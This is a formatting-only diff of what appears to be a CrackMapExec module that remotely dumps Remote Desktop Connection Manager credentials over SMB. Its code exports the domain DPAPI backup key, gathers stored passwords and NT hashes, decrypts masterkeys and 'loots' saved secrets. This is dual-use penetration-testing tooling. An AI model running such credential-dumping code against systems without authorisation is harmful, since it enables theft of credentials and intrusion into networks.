@@ -12,9 +12,7 @@ from cme.helpers.logger import highlight
 
 class CMEModule:
     name = "rdcman"
-    description = (
-        "Remotely dump Remote Desktop Connection Manager (sysinternals) credentials"
-    )
+    description = "Remotely dump Remote Desktop Connection Manager (sysinternals) credentials"
     supported_protocols = ["smb"]
     opsec_safe = True
     multiple_hosts = True
@@ -64,9 +62,7 @@ class CMEModule:
                 dc_conn.connect()
 
                 if dc_conn.is_admin:
-                    context.log.success(
-                        "User is Domain Administrator, exporting domain backupkey..."
-                    )
+                    context.log.success("User is Domain Administrator, exporting domain backupkey...")
                     backupkey_triage = BackupkeyTriage(target=dc, conn=dc_conn)
                     backupkey = backupkey_triage.triage_backupkey()
                     self.pvkbytes = backupkey.backupkey_v2
@@ -96,16 +92,8 @@ class CMEModule:
             context.log.debug("Could not upgrade connection: {}".format(e))
             return
 
-        plaintexts = {
-            username: password
-            for _, _, username, password, _, _ in context.db.get_credentials(
-                cred_type="plaintext"
-            )
-        }
-        nthashes = {
-            username: nt.split(":")[1] if ":" in nt else nt
-            for _, _, username, nt, _, _ in context.db.get_credentials(cred_type="hash")
-        }
+        plaintexts = {username: password for _, _, username, password, _, _ in context.db.get_credentials(cred_type="plaintext")}
+        nthashes = {username: nt.split(":")[1] if ":" in nt else nt for _, _, username, nt, _, _ in context.db.get_credentials(cred_type="hash")}
         if password != "":
             plaintexts[username] = password
         if nthash != "":
@@ -128,11 +116,7 @@ class CMEModule:
             context.log.fail("No masterkeys looted")
             return
 
-        context.log.success(
-            "Got {} decrypted masterkeys. Looting RDCMan secrets".format(
-                highlight(len(self.masterkeys))
-            )
-        )
+        context.log.success("Got {} decrypted masterkeys. Looting RDCMan secrets".format(highlight(len(self.masterkeys))))
 
         try:
             triage = RDGTriage(target=target, conn=conn, masterkeys=self.masterkeys)
